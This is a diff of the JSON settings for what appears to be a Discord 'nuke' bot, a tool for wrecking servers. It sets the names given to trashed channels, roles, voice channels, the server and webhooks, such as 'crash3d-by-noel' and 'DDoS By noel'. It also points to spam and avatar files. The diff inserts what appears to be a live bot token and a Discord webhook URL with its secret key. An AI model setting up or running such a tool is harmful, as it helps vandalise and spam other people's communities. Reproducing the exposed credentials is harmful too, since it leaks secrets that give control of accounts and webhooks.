@@ -1,16 +1,16 @@
 {
-	"token": "Token", 
+	"token": "MTIwNDA1MTc3MzE4NzI5MzE4NA.GxbK8o._RZZhnRmjjKt48XJkBt8xI_b1h7JFn3ZEsu9Do", 
 	"prefix": "!", "command_cooldown_time": 30, 
 
-	"loghook": "https://discordapp.com/api/webhooks/1105189152628158585/0gU-A80873sYOhlcUUsZqJx39FaGXy6qzy4pjLuRp77ZChgtDtrTkl7QNuZrKYMvFAoM", 
+	"loghook": "https://discord.com/api/webhooks/1204201746071691284/xfUuH7Q__WCrWw7ZWrqVOAmL6g43L4kbZngIOr3yj_KO0tfB_ewfuYetEtDItVRsWC4L", 
 	"logs_output_type": "console/webhook", 
 
-	"nuke_channels_name": "crash3d-by-anarchy", 
-	"nuke_voice_name": "DDoS By Anarchy", 
+	"nuke_channels_name": "crash3d-by-noel with help shadow_crazy_", 
+	"nuke_voice_name": "DDoS By noel", 
 	"nuke_categories_name": "DDoS By Anarchy", 
-	"nuke_server_name": "...<<<CrAsH3D>>>...", 
-	"nuke_roles_name": "crash3d", 
-	"nuke_webhook_name": "CrAsH3D by Anarchy Syndicate", 
+	"nuke_server_name": "...<<<CrAsH3D by noel shadow crazy adam>>>...", 
+	"nuke_roles_name": "crash3d by noel", 
+	"nuke_webhook_name": "CrAsH3D by Arte", 
 
 	"nuke_avatar_file": "avatar.jpg", 
 	"spam_text_file": "spam_text.txt"
